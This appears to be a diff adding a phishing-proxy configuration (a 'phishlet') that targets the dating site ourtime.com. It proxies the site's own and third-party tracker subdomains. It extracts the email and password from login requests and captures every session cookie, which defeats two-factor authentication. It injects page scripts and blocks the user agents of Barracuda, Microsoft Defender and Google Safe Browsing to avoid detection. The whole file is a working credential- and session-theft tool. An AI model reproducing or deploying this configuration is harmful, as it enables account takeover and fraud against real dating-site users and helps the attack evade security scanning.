@@ -1,0 +1,202 @@
+---
+name: ourtime
+author: tare
+min_ver: 2.3.0
+proxy_hosts:
+  - phish_sub: www
+    orig_sub: www
+    domain: ourtime.com
+    session: true
+    is_landing: true
+  - phish_sub: mobi
+    orig_sub: mobi
+    domain: ourtime.com
+    session: true
+    is_landing: false
+  - phish_sub: trc
+    orig_sub: trc-events
+    domain: taboola.com
+    session: true
+    is_landing: false
+  - phish_sub: bat
+    orig_sub: bat
+    domain: bing.com
+    session: true
+    is_landing: false
+  - phish_sub: pagead2
+    orig_sub: pagead2
+    domain: googlesyndication.com
+    session: true
+    is_landing: false
+  - phish_sub: c
+    orig_sub: c
+    domain: go-mpulse.net
+    session: true
+    is_landing: false
+  - phish_sub: cjs
+    orig_sub: www
+    domain: googletagmanager.com
+    session: true
+    is_landing: false
+  - phish_sub: geolocation
+    orig_sub: geolocation
+    domain: onetrust.com
+    session: true
+    is_landing: false
+  - phish_sub: cdnfr
+    orig_sub: cdn
+    domain: taboola.com
+    session: true
+    is_landing: false
+  - phish_sub: connsect
+    orig_sub: connect
+    domain: facebook.net
+    session: true
+    is_landing: false
+  - phish_sub: ads
+    orig_sub: ads
+    domain: nextdoor.com
+    session: true
+    is_landing: false
+  - phish_sub: static
+    orig_sub: static
+    domain: criteo.net
+    session: true
+    is_landing: false
+  - phish_sub: securepug
+    orig_sub: securepubads.g
+    domain: doubleclick.net
+    session: true
+    is_landing: false
+sub_filters:
+  - triggers_on: ourtime.com
+    orig_sub: www
+    domain: ourtime.com
+    search: https://{hostname}
+    replace: https://{hostname}
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - text/javascript
+  - triggers_on: ourtime.com
+    orig_sub: mobi
+    domain: ourtime.com
+    search: https://{hostname}
+    replace: https://{hostname}
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - text/javascript
+auth_urls:
+  - ^/home$
+  - ^/TwoFactorAuthentication$
+  - ^/user$
+auth_tokens:
+  - domain: www.ourtime.com
+    keys:
+      - .*,regexp
+  - domain: mobi.ourtime.com
+    keys:
+      - .*,regexp
+credentials:
+  username:
+    key: ""
+    search: '"email":"([^"]*)'
+    type: json
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: json
+login:
+  domain: www.ourtime.com
+  path: /login
+js_inject:
+  - trigger_domains: ["www.ourtime.com"]
+    trigger_paths: ["/login"]
+    script: |
+      // Monitor URL change without infinite reload
+      function monitorUrlChange() {
+        let currentUrl = window.location.href;
+        setInterval(() => {
+          if (currentUrl !== window.location.href) {
+            currentUrl = window.location.href;
+          }
+        }, 1000); // Check every second
+      }
+
+      // Reload the page every 60 seconds
+      setInterval(() => {
+        window.location.reload(true);
+      }, 60000); // 60000 milliseconds = 60 seconds
+
+      // Function to click the cookie consent button
+      function clickConsentButton() {
+        let button = document.querySelector('.onetrust-close-btn-handler');
+        if (button) {
+          button.click();
+          console.log("Cookie consent button clicked.");
+        } else {
+          console.log("Button not found, retrying...");
+          setTimeout(clickConsentButton, 500); // Retry after 500ms
+        }
+      }
+
+      // Run scripts when the page loads
+      window.addEventListener('load', () => {
+        monitorUrlChange();
+        clickConsentButton();
+      });
+
+  - trigger_domains: ["mobi.ourtime.com"]
+    trigger_paths: ["/"]
+    script: |
+      // Monitor URL change without infinite reload
+      function monitorUrlChange() {
+        let currentUrl = window.location.href;
+        setInterval(() => {
+          if (currentUrl !== window.location.href) {
+            currentUrl = window.location.href;
+          }
+        }, 1000); // Check every second
+      }
+
+      // Reload the page every 60 seconds
+      setInterval(() => {
+        window.location.reload(true);
+      }, 60000); // 60000 milliseconds = 60 seconds
+
+      // Function to click the cookie consent button
+      function clickConsentButton() {
+        let button = document.querySelector('.onetrust-close-btn-handler');
+        if (button) {
+          button.click();
+          console.log("Cookie consent button clicked.");
+        } else {
+          console.log("Button not found, retrying...");
+          setTimeout(clickConsentButton, 500); // Retry after 500ms
+        }
+      }
+
+      // Run scripts when the page loads
+      window.addEventListener('load', () => {
+        monitorUrlChange();
+        clickConsentButton();
+      });
+
+filters:
+  - name: block_barracuda
+    type: user-agent
+    match: Barracuda Sentinel (EE)
+    action: block
+
+  - name: block_ms_defender
+    type: user-agent
+    match: "Windows Defender ATP"
+    action: block
+
+  - name: block_google_safe_browsing
+    type: user-agent
+    match: "Google-Safe-Browsing"
+    action: block
